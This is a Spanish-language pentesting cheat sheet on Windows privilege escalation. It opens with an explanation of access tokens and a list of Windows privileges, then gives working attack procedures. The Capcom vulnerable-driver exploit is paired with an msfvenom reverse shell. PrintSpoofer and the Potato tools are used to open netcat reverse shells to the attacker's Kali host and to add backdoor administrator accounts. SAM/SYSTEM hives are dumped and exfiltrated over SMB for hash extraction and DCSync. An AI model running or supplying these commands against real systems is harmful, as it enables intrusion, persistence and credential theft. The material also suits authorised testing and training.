# Escalación de privilegios en Windows 

Tags: #AD #Windows #SeImpersonatePrivilege #SeAssignPrimaryTokenPrivilege

* [Escalacion-Privilegios-Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [Abusando de Tokens Windows - Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
* [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

## Tokens de acceso 

Los tokens de acceso en Windows son estructuras de datos que almacenan la información de seguridad y de usuario asociada a un proceso o hilo. Estas estructuras son esenciales dentro del modelo de seguridad de Windows, ya que definen los derechos y privilegios asignados a un proceso o hilo específico en el sistema.

A continuación, se presentan detalles clave sobre los tokens de acceso en Windows:


1. Tipos de Tokens: Hay dos tipos principales de tokens en Windows:
    
    - Token de usuario: Representa a un usuario que se ha autenticado con éxito. Está asociado con todos los procesos iniciados por ese usuario.
    - Token primario: Es el token asociado con un proceso cuando se inicia.
    - Token de impersonación: Permite a un hilo actuar con diferentes niveles de privilegio de su proceso contenedor. Es útil, por ejemplo, cuando un servicio necesita realizar tareas con privilegios diferentes.
        
    
2. Información en Tokens: Un token de acceso contiene información como:
    
    - Identificador de usuario (User SID): Identifica al usuario asociado con el token.
    - Grupos SID: Identifica a los grupos de los que el usuario es miembro.
    - Privilegios: Define acciones específicas que el usuario puede realizar, como apagar el sistema o cambiar la hora del sistema.
    - Tipo de token: Indica si el token es primario o de impersonación.
    - Nivel de impersonación: Si es un token de impersonation, este campo especifica el nivel (Anónimo, Identificación, Impersonación, Delegación).
    - Discretionary Access Control List (DACL): Especifica qué objetos puede acceder el portador del token y con qué permisos.
        
    
3. Impersonation: Esta es una característica clave en Windows que permite a un hilo tomar el token de otro usuario y "impersonarlo", es decir, actuar con los privilegios de ese usuario. Es útil en situaciones como servidores que necesitan acceder a recursos en nombre de un cliente.
    
4. Token Stealing: En el contexto de la seguridad, los tokens de acceso pueden ser objeto de abuso por parte de atacantes. Si un atacante logra comprometer un proceso o hilo con privilegios elevados, puede "robar" el token asociado y usarlo para impersonar a ese usuario o proceso de alto privilegio, facilitando la escalación de privilegios o el movimiento lateral.
    
5. Creación de Tokens: Los tokens de acceso se crean durante el proceso de autenticación. Cuando un usuario inicia sesión en una máquina Windows, el sistema genera un token de acceso que representa al usuario y a todos sus grupos y privilegios asociados.
    
6. Modificación de Tokens: A través de APIs específicas, es posible modificar tokens, aunque generalmente esto requiere privilegios elevados. Esta capacidad puede ser abusada por malware o atacantes para alterar los derechos y permisos de un token.


Los tokens de acceso desempeñan un papel fundamental en la infraestructura de seguridad de Windows. Brindan una notable flexibilidad para la gestión de identidades y accesos, aunque también pueden convertirse en un posible punto de ataque si no se manejan y protegen de forma adecuada. Por ello, es esencial que los administradores y expertos en seguridad entiendan su funcionamiento y las medidas necesarias para prevenir su uso indebido.

## Privilegios en Windows

* [Niveles de integridad - Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels)

En los sistemas operativos Windows, los privilegios son permisos otorgados a las cuentas de usuario y servicios, los cuales determinan las acciones que pueden ejecutarse en el sistema. Estos privilegios regulan aspectos clave de la seguridad y la administración del sistema, permitiendo desde la modificación del reloj del sistema hasta la gestión de registros y configuraciones de seguridad. A continuación, te presento una lista de los privilegios disponibles en Windows, aunque es importante tener en cuenta que esta lista puede variar ligeramente según la versión del sistema operativo.


1. SeAssignPrimaryTokenPrivilege: Asignar un token primario a un proceso.
2. SeAuditPrivilege: Generar eventos de auditoría de seguridad.
3. SeBackupPrivilege: Omitir comprobaciones de permisos para realizar operaciones de respaldo.
4. SeChangeNotifyPrivilege: Omitir la notificación de cambio de directorio.
5. SeCreateGlobalPrivilege: Crear objetos globales.
6. SeCreatePagefilePrivilege: Crear un archivo de paginación.
7. SeCreatePermanentPrivilege: Crear objetos permanentes.
8. SeCreateSymbolicLinkPrivilege: Crear enlaces simbólicos.
9. SeCreateTokenPrivilege: Crear un token de objeto.
10. SeDebugPrivilege: Depurar programas.
11. SeEnableDelegationPrivilege: Habilitar la delegación de seguridad.
12. SeImpersonatePrivilege: Impersonar a un cliente después de la autenticación.
13. SeIncreaseBasePriorityPrivilege: Aumentar la prioridad de proceso.
14. SeIncreaseQuotaPrivilege: Aumentar cuotas de proceso.
15. SeIncreaseWorkingSetPrivilege: Aumentar el conjunto de trabajo de un proceso.
16. SeLoadDriverPrivilege: Cargar y descargar controladores de dispositivos.
17. SeLockMemoryPrivilege: Bloquear páginas en memoria.
18. SeMachineAccountPrivilege: Agregar equipos al dominio.
19. SeManageVolumePrivilege: Realizar mantenimiento de volumen.
20. SeProfileSingleProcessPrivilege: Realizar monitoreo de rendimiento.
21. SeRelabelPrivilege: Modificar etiquetas de integridad de objetos.
22. SeRemoteShutdownPrivilege: Forzar el apagado desde un sistema remoto.
23. SeRestorePrivilege: Omitir comprobaciones de permisos para realizar operaciones de restauración.
24. SeSecurityPrivilege: Administrar auditoría y registro de seguridad.
25. SeShutdownPrivilege: Apagar el sistema.
26. SeSyncAgentPrivilege: Sincronizar datos de directorio.
27. SeSystemEnvironmentPrivilege: Modificar la configuración del entorno del firmware.
28. SeSystemProfilePrivilege: Realizar monitoreo de rendimiento del sistema.
29. SeSystemtimePrivilege: Cambiar la hora del sistema.
30. SeTakeOwnershipPrivilege: Tomar propiedad de archivos u otros objetos.
31. SeTcbPrivilege: Actuar como parte del sistema operativo.
32. SeTimeZonePrivilege: Cambiar la zona horaria.
33. SeTrustedCredManAccessPrivilege: Acceder a credenciales guardadas de manera segura.
34. SeUndockPrivilege: Desacoplar el sistema de la base.
35. SeUnsolicitedInputPrivilege: Leer la entrada no solicitada del terminal interactivo.

Cada uno de estos privilegios otorga la capacidad de realizar acciones concretas en el sistema que pueden influir en su configuración, seguridad y funcionamiento general. Los administradores del sistema deben gestionar y asignar estos privilegios con cuidado para garantizar la seguridad y el correcto desempeño de los sistemas Windows.

## Privilegios Windows que llevan a SYSTEM

```bash 
❯ whoami /priv        # Muestra los privilegios del usuario actual 
```

```powershell 
1. 'SeLoadDriverPrivilege' = Permite 'cargar drivers firmados' que se ejecutan con permisos del 'kernel (ring 0)'. Si puedes cargar un 'driver malicioso' (uno que eleva privilegios), te puedes convertir en 'NT AUTHORITY\SYSTEM' o incluso ejecutar código arbitrario en el núcleo


Pasos:
❯ https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp    # Copiar el codigo en Visual studio creando un nuevo proyecto 'Aplicación de consola'. Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'EoPLoadDriver.exe' a la máquina Windows comprometida
❯ https://github.com/FuzzySecurity/Capcom-Rootkit/tree/master/Driver    # Descargar el archivo 'Capcom.sys' y transferirlo a la máquina Windows comprometida

❯ .\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys  # Cargar y ejecutar el driver en Windopws. Debe de mostrar lo siguiente: 'NTSTATUS: 00000000, WinError: 0'

❯ https://github.com/tandasat/ExploitCapcom   # Descargar el proyecto completo en zip para abrirlo desde Visual Studio. Modificar la linea de 'LaunchShell' y colocar "C:\\ProgramData\\reverse.exe". Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'ExploitCapcom.exe' a la máquina Windows comprometida

❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o reverse.exe  # Crear el archivo malicioso en Kali y transferirlo a la máquina Windows comprometida

❯ .\ExploitCapcom.exe        # Ejecutar el archivo en Windows y obtener la revershell en Kali 

Notas:
	1. Si al momento de compilar da un error, eliminar '#include "stdafx.h"' y volverlo a compilar
	2. La ruta donde compila los archivos Visual Studio los muestra por la consola 
	3. Para obtener la revershell se debe estar en escucha con 'Netcat'
```

```powershell
2. 'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM

IMPORTANTE --> CONOCER LA VERIÓN del SISTEMA OPERATIVO PARAA SABER QUE POTATO USAR <-- 
❯ systeminfo 

   Sistema Operativo	                              Técnicas
Windows Server 2008 / 2008 R2	            JuicyPotato, RottenPotato
Windows Server 2012 / 2012 R2	            JuicyPotato, RoguePotato, GodPotato
Windows Server 2016 (<1809)	                JuicyPotato
Windows Server 2019 / Windows 10 1809+	    PrintSpoofer, RoguePotato, GodPotato
Windows Server 2022	                        GodPotato, SigmaPotato

++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# USAR PrintSpoofer64

PASOS con 'PrintSpoofer64' para ejecuta una Reverse Shell:
# Descargar PrintSpoofer64, Netcat y transferirlos a la máquina Windows en 'C:\Windows\Temp\'
❯ https://github.com/itm4n/PrintSpoofer/releases   
❯ https://eternallybored.org/misc/netcat/

❯ .\PrintSpoofer64.exe -c "cmd /c C:\Windows\Temp\nc.exe IP_Kali 4444 -e cmd"
# Ejecutar un comando como nt authority \system para hacer una Reverse shell 

++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# USAR PetitPotato

PASOS con 'PetitPotato' para crear un usuario y tener persistencia:
# Descargar el archivo y transferirlo a la máquina Windows comprometida 
❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0

❯ .\PetitPotato.exe 3 "cmd /c whoami"    
# Ejecutar en Windows y crear una cmd con el usuario 'NT Authority\System'
# EfsID = '3' es el numero de API a usar  
❯ .\PetitPotato.exe 3 "cmd /c net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
❯ .\PetitPotato.exe 3 "cmd /c net localgroup Administrators omar /add"   # Agregar el usuario al grupo 'Administrators'
❯ .\PetitPotato.exe 3 "cmd /c net user Omar"                             # Mirar el grupo de un usuario en especifico


Notas:
	- Despues de crear un usuario para tener persistencia, se puede ingresar con 'RDP' si esta abierto el puerto '3389' o con 'psexec' SMB por el puerto '445' 

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# USAR JuicyPotato

PASOS con 'JuicyPotato' para crear un usuario y tener persistencia:
# Descargar el archivo y transferirlo a la máquina Windows comprometida 
❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1

❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user omar P4ssw0rd /add" -l 1337
# Ejecutar en Windows para crear un usuario
	# t = Crear un proceso 
	# p = Programa a ejecutar 
	# a = Argumento
	# l = Puerto de escucha COM 
❯ JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators omar /add" -l 1337

❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
# Opcional en caso de que no deje ingresar y necesite el recurso compartido
❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337  


Notas:
	- Despues de crear un usuario para tener persistencia, se puede ingresar con 'RDP' si esta abierto el puerto '3389' o con 'psexec' SMB por el puerto '445' 


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# OTRA FORMA CON JuicyPotato

PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
# Descargar JuicyPotato, Netcat y transferirlos a la máquina Windows en 'C:\Windows\Temp\'
❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1    
❯ https://eternallybored.org/misc/netcat/

❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd IP_Kali 4444"
```

```powershell 
3. 'SeBackupPrivilege y SeRestorePrivilege' = Permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'

# Forma de explotar 
❯ https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md        


++++++++++++++++++++++++++++++++++

## FORMA 1
Pasos:   
❯ reg save hklm\sam C:\windows\temp\sam.hive           # Hacer una copia de la SAM en Windows y descargarlo 
❯ reg save hklm\system C:\windows\temp\system.hive     # Hacer una copia del system en Windows y descargarlo

❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL   
# Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos  


++++++++++++++++++++++++++++++++++

## FORMA 2
Pasos:
# Descargar la tool 
❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    

❯ python3 reg.py user:'passwd'@IP backup -p '\\IP\smbFolder'
	# user:passwd = Credenciales validas del usuario que se encuentra en el grupo 'Backup Operators'
	# IP = Dirección IP del DC
	# \\IP\share = Recurso compartido con la IP de Kali para recibir los archivos a descargar 
❯ impacket-smbserver smbFolder $(pwd) -smb2support    # Crear un server para recibir los archivos 'SAM, SECURITY y SYSTEM' y así poder hacer el dumpeo 

❯ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 

❯ impacket-secretsdump 'domain1.corp/user'@IP_DC -hashes :64fbae31cc352fc26af97cbdef151e03 # Hacer un DCSync
	# hashes = Hash ':NT' del usuario 

Notas:
	1. Crear el recuros compartido antes de ejecutar la herramineta 'reg.py'
	2. La ejecución de la herramienta 'reg.py' y el comando de 'impacket-smbserver' deben de ser en el mismo directorio en Kali para evitar un error 
```

